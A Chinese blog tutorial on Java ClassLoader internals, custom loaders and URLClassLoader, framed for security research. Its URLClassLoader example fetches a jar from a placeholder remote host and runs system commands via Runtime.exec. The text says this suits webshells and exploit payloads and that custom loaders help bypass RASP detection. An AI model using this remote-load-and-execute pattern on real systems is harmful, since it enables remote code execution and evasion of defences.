**目录**

[Java ClassLoader类加载机制](#t0)

[ClassLoader](#t1)

[Java类动态加载方式](#t2)

[ClassLoader类加载流程](#t3)

[自定义ClassLoader](#t4)

[URLClassLoader](#t5)

[ClassLoader总结](#t6)

* * *

Java ClassLoader类加载机制
---------------------

Java是一个依赖于JAVA [虚拟机](https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020)(JVM)实现的跨平台的高级开发语言。Java程序在运行前需要先将 .java 文件编译成 .clsss 文件 。Java类初始化的时候会调用 java.lang.ClassLoader 加载类字节码，ClassLoader会调用JVM的native 方法来定义一个 java.lang.Class实例。

![](https://img-blog.csdnimg.cn/20200628221126335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如下，我们创建一个Project1项目，base package为 com.company。我们的源文件为 Project1/src/com/company/Main.java，运行后，会生成 out/production/Project1/com/company/Main.class [字节码](https://so.csdn.net/so/search?q=%E5%AD%97%E8%8A%82%E7%A0%81&spm=1001.2101.3001.7020)文件。

![](https://img-blog.csdnimg.cn/2020062910153250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者直接用 javac 编译成 class 文件，然后用 javap 查看 class 文件。

```
javac Main.java      
javap -c -p -l Main.class
```


![](https://img-blog.csdnimg.cn/20200629124732677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

[JVM](https://so.csdn.net/so/search?q=JVM&spm=1001.2101.3001.7020)在执行代码之前会先解析 class 二进制内容，JVM执行的其实就是如上`javap`命令生成的字节码(`ByteCode`)。

### ClassLoader

      一切的Java类都必须经过JVM加载后才能运行，而 [ClassLoader](https://so.csdn.net/so/search?q=ClassLoader&spm=1001.2101.3001.7020) 的主要作用就是 Java 类的加载。在 JVM 类加载器中最顶层的是 Bootstrap ClassLoader(引导类加载器，该加载器实现于JVM层，采用C++编写)、Extension ClassLoader(扩展类加载器)、App ClassLoader(系统类加载器)。AppClassLoader是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用 AppClassLoader 加载类。 ClassLoader.getSystemClassLoader() 返回的系统类加载器也是 AppClassLoader。

     值得注意的是某些时候我们获取一个类的[类加载](https://so.csdn.net/so/search?q=%E7%B1%BB%E5%8A%A0%E8%BD%BD&spm=1001.2101.3001.7020)器的时候可能会返回一个null值。如：java.io.File.class.getClassLoader() 将返回一个 null 对象，因为 java.io.File 类在JVM初始化的时候会被 Bootstrap ClassLoader加载，我们在尝试获取被BootStrap ClassLoader类加载器所加载的类的ClassLoader的时候都会返回null。

ClassLoader类有如下核心方法：

*   loadClass：加载指定的Java类
*   findClass：查找指定的Java类
*   findLoaderClass：查找JVM已经加载过的类
*   defindClass：定义一个Java类
*   resolveClass：链接指定的Java类

### Java类动态加载方式

Java类加载方式分为 **显式** 和 **隐式。**显式即我们通常使用 **Java反射** 或者 **ClassLoader** 来动态加载一个类对象，而隐式指的是类名.方法名() 或 new  类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。

常用的类显示加载方式：

```
// 反射加载TestHelloWorld示例      
Class.forName("com.company.classloader.test");       
// ClassLoader加载TestHelloWorld示例      
this.getClass().getClassLoader().loadClass("com.company.test");
```


![](https://img-blog.csdnimg.cn/20200629140004709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

class.forName("类名") 默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用 Class.forName("类名"，是否初始化类，类加载器)，而ClassLoader.loadClass 默认不会初始化类方法。

### ClassLoader类加载流程

要想理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习`ClassLoader`。

`ClassLoader`加载`com.company.Main`类重要流程如下：

1.  `ClassLoader`会调用`public Class<?> loadClass(String name)`方法加载`com.company.Main`类。
2.  调用`findLoadedClass`方法检查类Main是否已经初始化，如果JVM已初始化过该类则直接返回类对象。
3.  如果创建当前`ClassLoader`时传入了父类加载器(`new ClassLoader(父类加载器)`)就使用父类加载器加载`Main`类，否则使用JVM的`Bootstrap ClassLoader`加载。
4.  如果上一步无法加载`Main`类，那么调用自身的`findClass`方法尝试加载`TestHelloWorld`类。
5.  如果当前的`ClassLoader`没有重写了`findClass`方法，那么直接返回类加载失败异常。如果当前类重写了`findClass`方法并通过传入的`com.company.Main`类名找到了对应的类字节码，那么应该调用`defineClass`方法去JVM中注册该类。
6.  如果调用loadClass的时候传入的`resolve`参数为true，那么还需要调用`resolveClass`方法链接类,默认为false。
7.  返回一个被JVM加载后的`java.lang.Class`类对象。  
     

### 自定义ClassLoader

`java.lang.ClassLoader`是所有类加载器的父类，`java.lang.ClassLoader`有非常多的子类加载器，比如我们用于加载jar包的`java.net.URLClassLoader`其本身通过继承`java.lang.ClassLoader`类，重写了`findClass`方法从而实现了加载目录class文件甚至是远程资源文件。

既然已知ClassLoader具备了加载类的能力，那么我们不妨尝试下写一个自己的类加载器来实现加载自定义的字节码(这里以加载test类为例)并调用`hello`方法。

我们创建Project1项目如下：

test类：

![](https://img-blog.csdnimg.cn/20200629103206519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果`com.company.test`类存在的情况下，我们可以使用如下代码即可实现调用`hello`方法并输出，Main.java类：

![](https://img-blog.csdnimg.cn/20200629103242653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

但是如果`com.company.test`根本就不存在于我们的`classpath`，那么我们可以使用自定义类加载器重写`findClass`方法，然后在调用`defineClass`方法的时候传入`test`类的字节码的方式来向JVM中定义一个`test`类，最后通过反射机制就可以调用`test`类的`hello`方法了。

我们创建Project2如下：

我们先创建test类：

```
package com.company;      
import java.io.Serializable;       
public class test implements Serializable {      
    String name="test";      
    public String example(){      
        return "hello,word!";      
    }      
}
```


**TestClassLoader类：**

```
package com.company;      
import java.lang.reflect.Method;      
public class TestClassLoader extends ClassLoader {       
    // test类名      
    private static String testClassName = "com.company.test";      
    // test类字节码      
    private static byte[] testClassBytes = new byte[]{      
            -84,-19,0,5,115,114,0,16,99,111,109,46,99,111,109,112,97,110,121,46,116,101,115,116,-39,42,-49,109,91,54,-9,18,2,0,1,76,0,4,110,97,109,101,116,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,120,112,116,0,4,116,101,115,116      1
    };      1
    @Override      1
    public Class<?> findClass(String name) throws ClassNotFoundException {      1
        // 只处理test类      1
        if (name.equals(testClassName)) {      1
            // 调用JVM的native方法定义test类      1
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);      1
        }      1
        return super.findClass(name);      1
    }      2
    public static void main(String[] args) {      2
        // 创建自定义的类加载器      2
        TestClassLoader loader = new TestClassLoader();      2
        try {      2
            // 使用自定义的类加载器加载test类      2
            Class testClass = loader.loadClass(testClassName);      2
            // 反射创建test类，等价于 test t = test();      2
            Object testInstance = testClass.newInstance();      2
            // 反射获取hello方法      2
            Method method = testInstance.getClass().getMethod("example");      3
            // 反射调用hello方法,等价于 String str = t.hello();      3
            String str = (String) method.invoke(testInstance);      3
            System.out.println(str);      3
        } catch (Exception e) {      3
            e.printStackTrace();      3
        }      3
    }      3
}
```


运行结果：

![](https://img-blog.csdnimg.cn/20200705222346372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的[native](https://so.csdn.net/so/search?q=native&spm=1001.2101.3001.7020)方法绕过RASP检测，也可以用于加密重要的Java类字节码(只能算弱加密了)。

注：这里TestClassLoader类的字节数组转换可以参考：[Java中对象和字节数组互转](https://xie1997.blog.csdn.net/article/details/107021477)

### URLClassLoader

`URLClassLoader`继承了`ClassLoader`，`URLClassLoader`提供了加载远程资源的能力，在写漏洞利用的`payload`或者`webshell`的时候我们可以使用这个特性来加载远程jar文件来实现远程的类方法调用。

我们先创建Project3，然后新建 TestURLClassLoader.java 文件

![](https://img-blog.csdnimg.cn/20200706182104520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**TestURLClassLoader.java内容如下：**

```
package com.company;       
import java.io.ByteArrayOutputStream;      
import java.io.InputStream;      
import java.net.URL;      
import java.net.URLClassLoader;      
public class TestURLClassLoader {      
    public static void main(String[] args) {      
        try {      1
            // 定义远程加载的jar路径      1
            URL url = new URL("http://xxx/Project4.jar");      1
            // 创建URLClassLoader对象，并加载远程jar包      1
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});      1
            // 定义需要执行的系统命令      1
            String cmd = "systeminfo";      1
            // 通过URLClassLoader加载远程jar包中的cmd类      1
            Class cmdClass = ucl.loadClass("cmd");      1
            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");      1
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);      2
            // 获取命令执行结果的输入流      2
            InputStream           in   = process.getInputStream();      2
            ByteArrayOutputStream baos = new ByteArrayOutputStream();      2
            byte[]                b    = new byte[1024];      2
            int                   a    = -1;      2
            // 读取命令执行结果      2
            while ((a = in.read(b)) != -1) {      2
                baos.write(b, 0, a);      2
            }      2
            // 输出命令执行结果      3
            System.out.println(baos.toString());      3
        } catch (Exception e) {      3
            e.printStackTrace();      3
        }      3
    }      3
}
```


远程的Project4.jar文件最中就一个cmd.class文件。新建一个Project4项目，创建cmd类，内容如下：

![](https://img-blog.csdnimg.cn/20200706181533995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
import java.io.IOException;       
import static java.lang.Runtime.getRuntime;       
public class cmd {      
    public static Process exec(String cmd) throws IOException{      
        return getRuntime().exec(cmd);      
    }      
    public static void main(String[] args) {       1
    }      1
}
```


然后将Project4项目将其打包成jar文件，如下

![](https://img-blog.csdnimg.cn/20200706181657347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

将Project4.jar文件上传到web目录下。

运行结果如下：

![](https://img-blog.csdnimg.cn/20200706181400469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

ClassLoader总结
-------------

`ClassLoader`是JVM中一个非常重要的组成部分，`ClassLoader`可以为我们加载任意的java类，通过自定义`ClassLoader`更能够实现自定义类加载行为，在后面的几个章节我们也将讲解`ClassLoader`的实际利用场景

本文所有代码：链接: [https://pan.baidu.com/s/1BB\_H\_\_A-lvCL3rQxrS7uJw](https://pan.baidu.com/s/1BB_H__A-lvCL3rQxrS7uJw) 提取码: uwdb